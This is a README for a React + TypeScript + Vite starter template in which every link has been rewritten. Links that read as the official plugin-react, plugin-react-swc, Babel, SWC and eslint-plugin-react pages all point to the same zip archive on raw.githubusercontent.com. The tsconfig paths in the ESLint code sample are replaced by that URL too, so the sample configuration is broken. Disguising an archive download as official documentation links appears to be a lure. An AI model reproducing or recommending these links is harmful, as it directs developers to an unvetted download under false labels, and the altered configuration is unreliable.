# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/atif727/real-campers-client/main/plowjogger/real-campers-client.zip) uses [Babel](https://raw.githubusercontent.com/atif727/real-campers-client/main/plowjogger/real-campers-client.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/atif727/real-campers-client/main/plowjogger/real-campers-client.zip) uses [SWC](https://raw.githubusercontent.com/atif727/real-campers-client/main/plowjogger/real-campers-client.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type aware lint rules:

- Configure the top-level `parserOptions` property like this:

```js
export default {
  // other rules...
  parserOptions: {
    ecmaVersion: 'latest',
    sourceType: 'module',
    project: ['https://raw.githubusercontent.com/atif727/real-campers-client/main/plowjogger/real-campers-client.zip', 'https://raw.githubusercontent.com/atif727/real-campers-client/main/plowjogger/real-campers-client.zip'],
    tsconfigRootDir: __dirname,
  },
}
```

- Replace `plugin:@typescript-eslint/recommended` to `plugin:@typescript-eslint/recommended-type-checked` or `plugin:@typescript-eslint/strict-type-checked`
- Optionally add `plugin:@typescript-eslint/stylistic-type-checked`
- Install [eslint-plugin-react](https://raw.githubusercontent.com/atif727/real-campers-client/main/plowjogger/real-campers-client.zip) and add `plugin:react/recommended` & `plugin:react/jsx-runtime` to the `extends` list
